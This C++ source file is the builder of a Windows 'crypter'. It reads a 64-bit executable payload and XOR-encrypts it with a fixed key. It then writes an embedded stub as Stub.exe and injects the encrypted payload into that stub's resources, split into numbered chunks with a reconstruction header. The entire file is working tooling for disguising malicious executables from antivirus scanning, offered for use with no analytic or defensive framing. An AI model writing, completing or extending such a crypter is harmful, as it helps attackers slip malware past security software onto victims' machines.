#include <iostream>
#include <windows.h>
#include <fstream>
#include <vector>
#include "stub_bytes.h"
#include <cstdint> 
using namespace std;

// ============================================================================
// STRUCTURES
// ============================================================================

#pragma pack(push, 1)
struct ChunkHeader {
    char magic[4];           // "FRAG" - identifies our format
    uint32_t total_size;     // Original payload size
    uint16_t total_chunks;   // Total number of chunks
    uint16_t chunk_size;     // Size of each chunk
    uint8_t encryption_key;  // XOR key
    uint32_t crc32;          // Checksum
    char marker[8];          // "CHUNK001" for verification
};
#pragma pack(pop)

// ============================================================================
// FUNCTION DECLARATIONS
// ============================================================================

bool ReadPayloadFile(const char* filename, char** buffer, long* size);
bool ValidatePEArchitecture(char* fileBuffer);
void DisplayChunkInfo(long fileSize, int chunkSize);
char* EncryptPayload(char* payload, long size, char key);
bool WriteStubToFile();
bool FragmentAndInjectPayload(char* encryptedPayload, long payloadSize, int chunkSize, char encryptionKey);
void CleanupResources(char* fileBuffer, char* encryptedBuffer);
uint32_t CalculateCRC32(const char* data, size_t length);

// ============================================================================
// MAIN FUNCTION
// ============================================================================

int main(int argc, char* argv[]) 
{
    if (argc < 2) {
        cout << "Usage: crypter.exe <payload.exe>" << endl;
        system("pause");
        return 1;
    }

    const char* payloadFilename = argv[1];
    char* fileBuffer = nullptr;
    char* encryptedPayload = nullptr;
    long fileSize = 0;
    const int CHUNK_SIZE = 4096;
    const char ENCRYPTION_KEY = 'k';

    // === STEP 1: Read payload file ===
    cout << "[*] Reading payload file..." << endl;
    if (!ReadPayloadFile(payloadFilename, &fileBuffer, &fileSize)) {
        return 1;
    }
    cout << "[+] Payload size: " << fileSize << " bytes" << endl;

    // === STEP 2: Validate PE architecture ===
    cout << "[*] Validating PE architecture..." << endl;
    if (!ValidatePEArchitecture(fileBuffer)) {
        CleanupResources(fileBuffer, encryptedPayload);
        return 1;
    }

    // === STEP 3: Calculate and display chunk information ===
    DisplayChunkInfo(fileSize, CHUNK_SIZE);

    // === STEP 4: Encrypt payload ===
    cout << "[*] Encrypting payload..." << endl;
    encryptedPayload = EncryptPayload(fileBuffer, fileSize, ENCRYPTION_KEY);
    if (!encryptedPayload) {
        CleanupResources(fileBuffer, encryptedPayload);
        return 1;
    }

    // === DEBUG: Add CRC verification checks ===
    cout << "[DEBUG] CRC Verification:" << endl;
    uint32_t crc_before = CalculateCRC32(fileBuffer, fileSize);
    uint32_t crc_after = CalculateCRC32(encryptedPayload, fileSize);
    cout << "[DEBUG] CRC of original payload: 0x" << hex << crc_before << dec << endl;
    cout << "[DEBUG] CRC of encrypted payload: 0x" << hex << crc_after << dec << endl;

    // Verify encryption/decryption round-trip
    char* testBuffer = (char*)malloc(fileSize);
    for (long i = 0; i < fileSize; i++) {
        testBuffer[i] = encryptedPayload[i] ^ ENCRYPTION_KEY;
    }
    uint32_t crc_roundtrip = CalculateCRC32(testBuffer, fileSize);
    free(testBuffer);

    cout << "[DEBUG] CRC after round-trip decrypt: 0x" << hex << crc_roundtrip << dec << endl;
    cout << "[DEBUG] Round-trip match: " << (crc_before == crc_roundtrip ? "YES" : "NO") << endl;

    if (crc_before != crc_roundtrip) {
        cout << "[-] ERROR: Encryption round-trip failed!" << endl;
        CleanupResources(fileBuffer, encryptedPayload);
        return 1;
    }

    // === STEP 5: Write stub executable ===
    cout << "[*] Writing stub executable..." << endl;
    if (!WriteStubToFile()) {
        CleanupResources(fileBuffer, encryptedPayload);
        return 1;
    }

    // === STEP 6: Fragment and inject payload ===
    cout << "[*] Fragmenting and injecting payload..." << endl;
    if (!FragmentAndInjectPayload(encryptedPayload, fileSize, CHUNK_SIZE, ENCRYPTION_KEY)) {
        CleanupResources(fileBuffer, encryptedPayload);
        return 1;
    }

    // === STEP 7: Success message ===
    int totalChunks = (fileSize + CHUNK_SIZE - 1) / CHUNK_SIZE;
    cout << "\n[SUCCESS] Fragmentation Complete!" << endl;
    cout << "==================================" << endl;
    cout << "Stub.exe created with fragmented payload" << endl;
    cout << "Total chunks: " << totalChunks << endl;
    cout << "Payload size: " << fileSize << " bytes" << endl;
    cout << "Resources: 132 to " << (132 + totalChunks - 1) << endl;
    cout << "First chunk contains reconstruction metadata" << endl;

    // === Cleanup ===
    CleanupResources(fileBuffer, encryptedPayload);
    return 0;
}

// ============================================================================
// FUNCTION IMPLEMENTATIONS
// ============================================================================

bool ReadPayloadFile(const char* filename, char** buffer, long* size) 
{
    FILE* file = fopen(filename, "rb");
    if (!file) {
        cerr << "[-] Failed to open file: " << filename << endl;
        return false;
    }

    fseek(file, 0, SEEK_END);
    *size = ftell(file);
    rewind(file);

    *buffer = (char*)malloc(*size);
    if (!*buffer) {
        cerr << "[-] Memory allocation failed" << endl;
        fclose(file);
        return false;
    }

    if (fread(*buffer, 1, *size, file) != *size) {
        cerr << "[-] Failed to read file content" << endl;
        fclose(file);
        free(*buffer);
        return false;
    }

    fclose(file);
    return true;
}

bool ValidatePEArchitecture(char* fileBuffer) 
{
    IMAGE_DOS_HEADER* dosHeader = (PIMAGE_DOS_HEADER)fileBuffer;
    IMAGE_NT_HEADERS64* ntHeader = (PIMAGE_NT_HEADERS64)((DWORD64)fileBuffer + dosHeader->e_lfanew);

    bool is64Bit = ntHeader->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64;
    
    if (is64Bit) {
        cout << "[+] Payload is x64 architecture" << endl;
    } 
    else if (ntHeader->FileHeader.Machine == IMAGE_FILE_MACHINE_I386) {
        cout << "[-] Payload is x86 (unsupported)" << endl;
        return false;
    }
    else {
        cout << "[-] Unknown architecture" << endl;
        return false;
    }

    return is64Bit;
}

void DisplayChunkInfo(long fileSize, int chunkSize) 
{
    int totalChunks = (fileSize + chunkSize - 1) / chunkSize;
    
    cout << "\n=== CHUNK DISTRIBUTION ===" << endl;
    cout << "Chunk size: " << chunkSize << " bytes" << endl;
    cout << "Total chunks: " << totalChunks << endl;
    cout << "Chunk details:" << endl;
    
    for (int i = 0; i < totalChunks; i++) {
        int chunkStart = i * chunkSize;
        int chunkEnd = ((i + 1) * chunkSize < fileSize) ? (i + 1) * chunkSize : fileSize;
        int chunkSizeActual = chunkEnd - chunkStart;
        int resourceId = 132 + i;
        
        cout << "  Chunk " << i << " (ID " << resourceId << "): " 
             << chunkSizeActual << " bytes at offset 0x" << hex << chunkStart << dec << endl;
    }
    cout << "==========================" << endl;
}

char* EncryptPayload(char* payload, long size, char key) 
{
    char* encrypted = (char*)malloc(size);
    if (!encrypted) {
        cerr << "[-] Failed to allocate encryption buffer" << endl;
        return nullptr;
    }

    // ENCRYPTION ENABLED - XOR encryption
    for (long i = 0; i < size; i++) {
        encrypted[i] = payload[i] ^ key;
    }

    cout << "[+] Payload encrypted with XOR key: '" << key << "'" << endl;
    return encrypted;
}

bool WriteStubToFile() 
{
    fstream file("Stub.exe", ios::out | ios::binary);
    if (!file.write(reinterpret_cast<const char*>(Stub_exe), Stub_exe_len)) {
        cerr << "[-] Failed to write Stub.exe" << endl;
        file.close();
        return false;
    }
    
    file.close();
    cout << "[+] Stub.exe written successfully" << endl;
    return true;
}

uint32_t CalculateCRC32(const char* data, size_t length) 
{
    uint32_t crc = 0xFFFFFFFF;
    for (size_t i = 0; i < length; i++) {
        crc ^= (uint32_t)data[i];
        for (int j = 0; j < 8; j++) {
            crc = (crc >> 1) ^ (0xEDB88320 & -(crc & 1));
        }
    }
    return ~crc;
}

bool FragmentAndInjectPayload(char* encryptedPayload, long payloadSize, int chunkSize, char encryptionKey) 
{
    HANDLE resourceHandle = BeginUpdateResourceA("Stub.exe", FALSE);
    if (!resourceHandle) {
        cerr << "[-] Failed to open Stub.exe for resource update" << endl;
        return false;
    }

    int totalChunks = (payloadSize + chunkSize - 1) / chunkSize;
    
    // === Create chunk header ===
    ChunkHeader header;
    memcpy(header.magic, "FRAG", 4);
    header.total_size = payloadSize;
    header.total_chunks = totalChunks;
    header.chunk_size = chunkSize;
    header.encryption_key = encryptionKey;
    
    // Calculate CRC on the ORIGINAL (decrypted) data
    char* tempBuffer = (char*)malloc(payloadSize);
    for (long i = 0; i < payloadSize; i++) {
        tempBuffer[i] = encryptedPayload[i] ^ encryptionKey;
    }
    uint32_t calculatedCRC = CalculateCRC32(tempBuffer, payloadSize);
    header.crc32 = calculatedCRC;
    
    memcpy(header.marker, "CHUNK001", 8);

    cout << "[DEBUG] Header CRC being stored: 0x" << hex << header.crc32 << dec << endl;
    cout << "[DEBUG] Header total_size: " << header.total_size << endl;
    cout << "[DEBUG] Header total_chunks: " << header.total_chunks << endl;

    cout << "[+] Fragmenting into " << totalChunks << " chunks:" << endl;

    // === Create and inject chunk 0 (with header) ===
    int chunk0DataSize = (chunkSize < payloadSize) ? chunkSize : payloadSize;
    vector<char> chunk0(sizeof(header) + chunk0DataSize);
    
    // Copy header
    memcpy(chunk0.data(), &header, sizeof(header));
    // FIXED: Copy first chunk's ENCRYPTED data (consistent with other chunks)
    memcpy(chunk0.data() + sizeof(header), encryptedPayload, chunk0DataSize);

    cout << "    Chunk 0 (ID 132): " << chunk0.size() << " bytes (header + " << chunk0DataSize << " ENCRYPTED data)" << endl;

    if (!UpdateResourceA(resourceHandle, "BIN", MAKEINTRESOURCEA(132),
                        MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL),
                        chunk0.data(), chunk0.size())) {
        cerr << "[-] Failed to inject chunk 0" << endl;
        free(tempBuffer);
        EndUpdateResource(resourceHandle, TRUE);
        return false;
    }

    // === Inject remaining chunks (ENCRYPTED data only) ===
    for (int chunkIndex = 1; chunkIndex < totalChunks; chunkIndex++) {
        int chunkOffset = chunkIndex * chunkSize;
        int currentChunkSize = (chunkSize < (payloadSize - chunkOffset)) ? chunkSize : (payloadSize - chunkOffset);
        int resourceId = 132 + chunkIndex;

        cout << "    Chunk " << chunkIndex << " (ID " << resourceId << "): " << currentChunkSize << " bytes at offset 0x" << hex << chunkOffset << dec << endl;

        if (!UpdateResourceA(resourceHandle, "BIN", MAKEINTRESOURCEA(resourceId),
                            MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL),
                            encryptedPayload + chunkOffset, currentChunkSize)) {
            cerr << "[-] Failed to inject chunk " << chunkIndex << endl;
            free(tempBuffer);
            EndUpdateResource(resourceHandle, TRUE);
            return false;
        }
    }

    free(tempBuffer);

    // === Finalize resource update ===
    if (!EndUpdateResource(resourceHandle, FALSE)) {
        cerr << "[-] Failed to finalize resource update" << endl;
        return false;
    }

    cout << "[+] Successfully injected " << totalChunks << " chunks into Stub.exe" << endl;
    return true;
}

void CleanupResources(char* fileBuffer, char* encryptedBuffer) 
{
    if (fileBuffer) {
        free(fileBuffer);
    }
    if (encryptedBuffer) {
        free(encryptedBuffer);
    }
}